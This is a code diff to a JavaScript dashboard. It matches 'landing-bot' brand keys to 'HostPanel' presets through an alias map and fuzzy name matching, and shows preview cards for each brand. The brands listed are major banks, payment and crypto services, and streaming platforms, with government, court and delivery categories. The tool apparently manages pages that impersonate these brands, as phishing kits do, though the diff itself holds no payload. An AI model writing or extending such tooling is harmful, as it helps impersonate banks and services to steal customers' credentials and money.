@@ -785,6 +785,55 @@ function getBrandCat(key) {
   return '';
 }
 
+// Explicit aliases: landing-bot key → HostPanel id(s)
+const HP_ALIASES = {
+  jpmorganchase: ['chase_bank'],
+  bankofamerica: ['bank_of_america'],
+  wellsfargo:    ['wells_fargo'],
+  deutschebank:  ['deutsche_bank'],
+  bnpparibas:    ['bnp_paribas'],
+  goldmansachs:  ['generic_financial'],
+  creditsuisse:  ['credit_suisse'],
+  tdbank:        ['td_bank'],
+  rbc:           ['rbc_bank'],
+  usbank:        ['us_bancorp'],
+  abnamro:       ['abn_amro'],
+  standardchartered: ['standard_chartered'],
+  cryptocom:     ['crypto_com'],
+  cashapp:       ['cash_app'],
+  applepay:      ['apple_pay'],
+  googlepay:     ['google_pay'],
+  wisetransfer:  ['wise_transfer'],
+  twitterx:      ['twitter_x'],
+  netflixvideo:  ['netflix'],
+  disneyplus:    ['disney_plus'],
+  amazontv:      ['amazon_prime'],
+  appletvplus:   ['apple_tv'],
+  youtubemusic:  ['youtube_premium'],
+  hbomax:        ['hbo_max'],
+  paramountplus: ['paramount_plus'],
+};
+
+// Strip suffixes/prefixes to get a canonical brand name for fuzzy matching
+function brandBase(id) {
+  return id.toLowerCase()
+    .replace(/_(bank|crypto|tech|gov|telecom|ecommerce|delivery|court|us|uk|au|eu|ca|nz|global|security|2)$/g,'')
+    .replace(/^(us_|uk_|canadian_|australia_)/,'')
+    .replace(/_/g,'');
+}
+
+function brandsMatch(lbKey, hpId) {
+  if (lbKey === hpId) return true;
+  // Check explicit alias map
+  if (HP_ALIASES[lbKey] && HP_ALIASES[lbKey].includes(hpId)) return true;
+  const lb = brandBase(lbKey);
+  const hp = brandBase(hpId);
+  if (lb === hp) return true;
+  // partial: one contains the other and they're close in length
+  if ((lb.includes(hp) || hp.includes(lb)) && Math.abs(lb.length - hp.length) <= 3) return true;
+  return false;
+}
+
 async function loadBrands() {
   if (brandsLoaded) return;
   brandsLoaded = true;
@@ -798,20 +847,28 @@ async function loadBrands() {
 
 function renderBrands() {
   const hp = hpPresets || [];
-  const matchKeys = BRAND_KEYS.filter(k => hp.includes(k) || hp.includes(k.replace(/(video|audio)$/,'')));
+  // Build a map: lbKey → matched HP id (or null)
+  const matchMap = {};
+  BRAND_KEYS.forEach(key => {
+    const found = hp.find(hpId => brandsMatch(key, hpId));
+    matchMap[key] = found || null;
+  });
+  const matchKeys = BRAND_KEYS.filter(k => matchMap[k]);
   document.getElementById('brandMatchCount').textContent = matchKeys.length;
   document.getElementById('brandOnlyCount').textContent = BRAND_KEYS.length - matchKeys.length;
 
   const grid = document.getElementById('brandGrid');
   grid.innerHTML = BRAND_KEYS.map(key => {
     const cat = getBrandCat(key);
-    const match = hp.includes(key) || hp.includes(key.replace(/(video|audio)$/,''));
+    const hpId = matchMap[key];
+    const match = !!hpId;
+    const hpLabel = hpId && hpId !== key ? `✓ ${hpId}` : '✓ HostPanel';
     return `<div class="brand-card ${match ? 'has-match' : 'no-match'}"
                  data-key="${key}" data-cat="${cat}" data-match="${match ? 'match' : 'only'}"
                  onclick="window.location='/preview/${key}'" title="Preview ${key}">
       <div class="bc-key">${key}</div>
       <div class="bc-cat">${cat}</div>
-      <div class="bc-match ${match ? 'yes' : 'no'}">${match ? '✓ HostPanel' : '○ Only here'}</div>
+      <div class="bc-match ${match ? 'yes' : 'no'}">${match ? hpLabel : '○ Only here'}</div>
     </div>`;
   }).join('');
   filterBrands();
